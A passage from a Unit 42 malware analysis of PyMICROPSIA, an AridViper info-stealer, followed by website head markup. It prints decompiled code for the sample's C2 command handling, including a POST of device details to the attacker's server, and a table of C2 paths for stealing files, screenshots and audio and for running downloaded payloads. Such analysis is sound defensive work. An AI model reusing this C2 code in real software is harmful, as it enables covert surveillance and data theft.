resArr.split(';')[1]\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if Im_extintion == 'Rapunzel':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 path = args_parser(MyFolderName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Upload_File('else', path, FranDrescher, Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if status:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Delete_Request(Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if Im_extintion == 'Gal_Gadot':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0path = Sec_Shot(MyFolderName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Upload_File('lucretia', path, FranDrescher, Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if status:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Delete_Request(Im_extin)\r\n...\r\n...\r\n...\r\nif Im_extintion == 'Ed_ONeill':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 F_Out = resArr.split(';')[2]\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 src_B = base64ToString(F_Out)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if src_B == 'delete':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Del_Outlook()\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 else:\r\n...\r\n...\r\n...\r\nif Im_extintion == 'groot':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 src_path = resArr.split(';')[2]\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 dist_path = resArr.split(';')[3]\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 src_B = base64ToString(src_path)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 src_B_D = base64ToString(dist_path)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if os.path.exists(src_B) and os.path.exists(src_B_D\r\n[end code]\r\n\r\nThe response is split via \u2018;\u2019 delimiter, and depending on the position, contains parameters that can be received in plain text or encoded in base64, depending on each situation.\r\n\r\nThe following table summarizes the paths and parameters used during the C2 interactions and their functionality:\r\n\r\n\r\n\r\nPath\r\nMethod\r\nVariables\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/samantha\r\nDelete request. Unregister.\r\nbeau\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/lashawna\r\nDevice registration.\r\nbeau\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/matheny\r\nSend command output data.\r\nbeau, terrel\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/uiasfvz\r\nUSB device information\r\nbeau, type\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/daryl\r\nDelete request.\r\narturo, beau\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/qprbudls\r\nDownload payload.\r\nbeau\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/nyrvoz\r\nDownload URL.\r\nbeau\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/hortense1\r\nUpload file.\r\nbeau, type, FComp, terrel\r\n\r\n\r\n\r\nTable 4. Paths and parameters used during C2 interactions and their functionality..\r\n\r\nInteracting with C2 Operator\r\nBased on the main activity loop, there will be a periodic call to the C2 server, and it will begin by sending information regarding the device (device identifier), as well as the last modified time in disk.\r\n\r\n[begin code]\r\ndef Chick_Request():\r\n\u00a0 \u00a0global FranDrescher\r\n\u00a0 \u00a0global WD\r\n\u00a0 \u00a0global Wv\r\n\u00a0 \u00a0url = FranDrescher + '\/zoailloaze\/sfuxmiibif\/lashawna'\r\n\u00a0 \u00a0ur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})\r\n\u00a0 \u00a0resArr = ur.text\r\n\u00a0 \u00a0Im_extin = resArr.split(';')[0]\r\n[end code]\r\n\r\nIt's interesting to see how this captures the latest disk activity date. The code shows that it is incomplete, as in this case, the type is \u20184\u2019, and it will always return the string \u2018empty\u2019 instead of any kind of date:\r\n\r\n[begin code]\r\ndef getLastModDir(type):\r\n\u00a0 \u00a0try:\r\n\u00a0 \u00a0 \u00a0 c = wmi.WMI()\r\n\u00a0 \u00a0 \u00a0 Mv = ''\r\n\u00a0 \u00a0 \u00a0 for drive in c.Win32_LogicalDisk(DriveType=type):\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0Mv = drive.Caption\r\n\u00a0 \u00a0 \u00a0 last_date = ''\r\n\u00a0 \u00a0 \u00a0 dirpath = Mv\r\n\u00a0 \u00a0 \u00a0 entries = (os.path.join(dirpath, fn) for fn in os.listdir(dirpath))\r\n\u00a0 \u00a0 \u00a0 entries = ((os.stat(path), path) for path in entries)\r\n\u00a0 \u00a0 \u00a0 entries = ((stat[ST_MTIME], path) for stat, path in entries if S_ISREG(stat[ST_MODE]))\r\n\u00a0 \u00a0 \u00a0 for cdate, path in entries:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 last_date = datetime.datetime.fromtimestamp(cdate)\r\n\r\n\u00a0 \u00a0 \u00a0 if type == 4:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 return 'empty'\r\n\u00a0 \u00a0 \u00a0 return last_date\r\n\u00a0 \u00a0except Exception as e:\r\n\u00a0 \u00a0 \u00a0 return 'empty'\r\n[end code]\r\n\r\nThere are several examples of implementations like this across the code, which show an incomplete or ongoing implementation, which is a signal that the sample is still under active development by the actor.\r\n\r\nAs we mentioned before, the response string is split by its delimiter and the commands and encoded parameters sent by the C2 operator are parsed. As an interesting fact, the commands are full of references to Disney (in the past, we have seen AridViper using variables referencing characters of The Big Bang Theory or Game of Thrones, for example).\r\n\r\n[caption id=\"attachment_110198\" align=\"aligncenter\" width=\"900\"] Figure 21. C2 commands example.[\/caption]\r\n\r\nAnother interesting example of incomplete code is the fact that the code won\u2019t be able to go through all the possible branches and functionality in the C2 implementation. For example, in the following code snippet, if the code enters into the \u201cMulan\u201d branch, it won\u2019t enter into the \u201cVanellope\u201d code block:\r\n\r\n[begin code]\r\nif Im_extintion == 'Mulan':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0path = Process_list(MyFolderName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Upload_File('else', path, FranDrescher, Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if status:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Delete_Request(Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if Im_extintion == 'Mulan_Fire':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 K_process('firefox.exe')\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Compress_File_Rar_WithoutDel2()\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Delete_Request(Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if Im_extintion == 'Vanellope':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 path = Get_ImgType(MyFolderName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Upload_File('else', path, FranDrescher, Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if status:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Delete_Request(Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if Im_extintion == 'Calhoun':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0path = Get_VedioType(MyFolderName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Upload_File('else', path, FranDrescher, Im_extin)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if status:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 status = Delete_Request(Im_extin)\r\n[end code]\r\n\r\nThis is another signal of incomplete implementation and possible active development.\r\n\r\nA summary of the commands that are reachable by code execution has been provided in Table 2.\r\nInformation-Stealing and Control Capabilities\r\nThis malware sample has a rich set of information-stealing and control capabilities, whether they\u2019re reachable in the current C2 implementation or not. The following sections will detail some of the most relevant capabilities only, in order to provide visibility into how this malware family is implemented.\r\nAudio Recording\r\nAudio recording is achieved with the usage of the pyaudio and wave Python libraries. Data is stored under the \u201cDevNameSound\u201d folder.\r\n\r\n[caption id=\"attachment_110200\" align=\"aligncenter\" width=\"900\"] Figure 22. Audio recording implementation.[\/caption]\r\n\r\nThe recordings are stored in the corresponding folder, and the running threads as well as the operator commands will allow for the retrieval of the information captured.\r\nFile Download Capabilities\r\nThe ability to download files from the C2 is implemented via a POST request to the following URL path:\r\n\r\n\/zoailloaze\/sfuxmiibif\/qprbudls\r\n\r\nAs part of the POST request, a parameter named \u201cbeau\u201d will be used to specify the type of file download. Based on its value, it can download specific payloads as well as given URLs. The code looks as follows:\r\n\r\n[caption id=\"attachment_110202\" align=\"aligncenter\" width=\"900\"] Figure 23. Download code example.[\/caption]\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nValue of \u201cbeau\u201d\r\nAction\r\n\r\n\r\n\u20181\u2019\r\nDownload a legit version or rar.exe.\r\n\r\n\r\n\u20182\u2019\r\nDownload MetroIntelGenericUIFram.exe.\r\n\r\n\r\n\u20183\u2019\r\nDownload SynLocSynMomentum.exe.\r\n\r\n\r\nA given URL\r\nDownload from any specified URL.\r\n\r\n\r\n\r\nTable 5. Values of \u201cbeau\u201d for sample download.\r\n\r\nFile Uploading \r\nThe malware sample starts threads that will periodically upload compressed samples located in different folders.\r\n\r\n[caption id=\"attachment_110204\" align=\"aligncenter\" width=\"900\"] Figure 24. Upload threads initialized by the sample.[\/caption]\r\n\r\nFile uploads are performed via POST request to the following path:\r\n\r\n\/zoailloaze\/sfuxmiibif\/hortense1\r\n\r\nData is specified via a POST parameter, \u201cbeau\u201d, that can contain several variables, always delimited with \u201c;\u201d. Files are specified with a POST parameter named \u201cterrel\u201d.\r\n\r\nBoth the mentioned threads, as well as the operators via C2 interaction, can invoke upload code. Here is one example of such a method, where the implementation can be observed:\r\n\r\n[caption id=\"attachment_110206\" align=\"aligncenter\" width=\"900\"] Figure 25. Upload method example.[\/caption]\r\nScreenshot Capabilities\r\nScreenshots are sent to the C2 using Python\u2019s mss library both periodically as well as on demand if the C2 operator sends the appropriate command.\r\n\r\n[caption id=\"attachment_110208\" align=\"aligncenter\" width=\"900\"] Figure 26. Screenshot capabilities.[\/caption]\r\nFile Gathering Information\r\nThroughout the code, multiple methods oriented toward collecting information can be found. The methods are invoked based on different interactions with the C2 operator, and they give the operators flexibility on what kind of information they want to collect.\r\n\r\nFor example, there are generic methods to collect specific folders and with different levels of information detailed, as can be seen in several of the figures below.\r\n\r\n[caption id=\"attachment_110210\" align=\"aligncenter\" width=\"900\"] Figure 27. Collection of samples under C:\\users and C:\\Documents and Settings.[\/caption]\r\n\r\n[caption id=\"attachment_110212\" align=\"aligncenter\" width=\"900\"] Figure 28. Detailed collection of samples under several folders of interest in JSON format.[\/caption]\r\n\r\nThere are methods to collect information from external drives:\r\n\r\n[caption id=\"attachment_110214\" align=\"aligncenter\" width=\"900\"] Figure 29. Example of USB information collection.[\/caption]\r\n\r\nAs well as other approaches, such as methods to focus on specific file extensions.\r\n\r\n[caption id=\"attachment_110216\" align=\"aligncenter\" width=\"900\"] Figure 30. Example of collection of file information by specific extension type.[\/caption]\r\nFile Retrieval\r\nFile operators have plenty of commands that allow different types of files to be collected from disk. This method of collection is normally accomplished by selecting the target files and using the legitimate RAR utility to compress data that will be uploaded to the C2. The following example shows how the commands focus on specific extensions:\r\n\r\n[caption id=\"attachment_110218\" align=\"aligncenter\" width=\"900\"] Figure 31. Example of file selection, compression and gathering by extension type.[\/caption]\r\nCommand Execution\r\nThe AridViper operators have the ability to send parameters together with the commands across the C2 interaction. These commands are split by a specific delimiter \u2018;\u2019 in this sample, travelling encoded in base64. The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc.\r\n\r\n[caption id=\"attachment_110220\" align=\"aligncenter\" width=\"820\"] Figure 32. URL download and process execution examples.[\/caption]","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2020\/12\/Malware-r3d1.png","width":150,"height":75},"author":[{"@type":"Person","name":"Unit 42"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='application/json' id="wpp-json">
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":110155,"token":"48c7bc53a4","lang":0,"debug":0}
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=5.2.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.4.3'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=110155' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fpymicropsia%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fpymicropsia%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.4.3 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-110155 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
